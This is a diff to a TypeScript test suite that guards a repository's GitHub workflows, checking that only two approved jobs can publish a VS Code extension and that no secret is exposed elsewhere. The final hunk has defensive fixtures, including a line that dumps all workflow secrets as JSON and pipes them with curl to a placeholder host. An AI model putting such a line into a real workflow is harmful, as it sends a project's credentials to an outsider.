@@ -9,7 +9,7 @@
  * so no code of a third party runs in a job that can ask for the Marketplace's token. Everywhere else the command
  * that sends the file to a store and the tokens that let it are refused: another workflow, another job of that
  * workflow, a job of it that does not ask for the environment, the header of the file, a package script. The
- * Marketplace token (`VSCE_PAT`) is named nowhere, and `--oidc` is in the one job.
+ * Marketplace token (`VSCE_PAT`) is named nowhere, and `--oidc` is in the Marketplace's job only.
  * This reads every workflow git carries (not `release.yml` by name only: the next one will not announce itself)
  * and every package manifest. The text is read comments included, so a token named in a comment is a token
  * named; a comment sits with the job that follows it.
@@ -60,7 +60,7 @@ const PUBLISHES = new RegExp(
 );
 
 /**
- * What no place may hold, the one job included: a way to reach a secret that does not name it (a computed name,
+ * What no place may hold, the two jobs included: a way to reach a secret that does not name it (a computed name,
  * all of them, the whole set handed on), the Entra credential that publishes without a token, and a trigger
  * that runs the workflow, secrets and all, on what a pull request brings.
  */
@@ -153,7 +153,7 @@ function offences(where: string, text: string): string[] {
 const RELEASE = readFileSync(join(ROOT, PLACE.workflow), 'utf-8');
 
 describe('two jobs publish the extension, behind an approval', () => {
-  it('has no publish command or marketplace token in any workflow or package script but the one job', () => {
+  it('has no publish command or marketplace token in any workflow or package script but the two jobs', () => {
     const found = WORKFLOWS.flatMap((where) =>
       offences(where, readFileSync(join(ROOT, where), 'utf-8')),
     );
@@ -303,10 +303,14 @@ describe('two jobs publish the extension, behind an approval', () => {
     expect(offences(PLACE.workflow, idToken)).toEqual([
       `${PLACE.workflow}: job ${PLACE.openVsx} can ask for the OIDC token, and it runs ovsx`,
     ]);
-    const joined = RELEASE.replace(/^ {2}publish-open-vsx:$/m, '  publish-both:');
+    const ovsxStep = RELEASE.slice(RELEASE.indexOf('      - name: Publish to Open VSX\n'));
+    const vsceLine = RELEASE.match(/^.*\/\.bin\/vsce" publish --oidc .*\n/m)?.[0] ?? '';
+    expect(ovsxStep).toContain('/.bin/ovsx" publish');
+    expect(vsceLine).not.toBe('');
+    const joined = RELEASE.replace(vsceLine, `${vsceLine}\n${ovsxStep}`);
     expect(joined).not.toBe(RELEASE);
     expect(offences(PLACE.workflow, joined)).toEqual([
-      `${PLACE.workflow}: job publish-both publishes the extension or holds a token for it`,
+      `${PLACE.workflow}: job ${PLACE.marketplace} holds a secret, and it publishes by trusted publishing`,
     ]);
   });
 
@@ -353,7 +357,7 @@ describe('two jobs publish the extension, behind an approval', () => {
     expect(offences('.github/workflows/ci.yml', `jobs:\n  a:\n    steps:\n${bin}`)).toHaveLength(1);
   });
 
-  it('refuses a secret reached by a computed name or all at once, even in the one job', () => {
+  it('refuses a secret reached by a computed name or all at once, even in the two jobs', () => {
     const computed = `      - run: echo "\${{ secrets[format('OVSX_{0}', 'P')] }}"\n`;
     const dumped = `      - run: echo '\${{ toJSON(secrets) }}' | curl -d @- https://example.test\n`;
     const inherited = '    secrets: inherit\n';
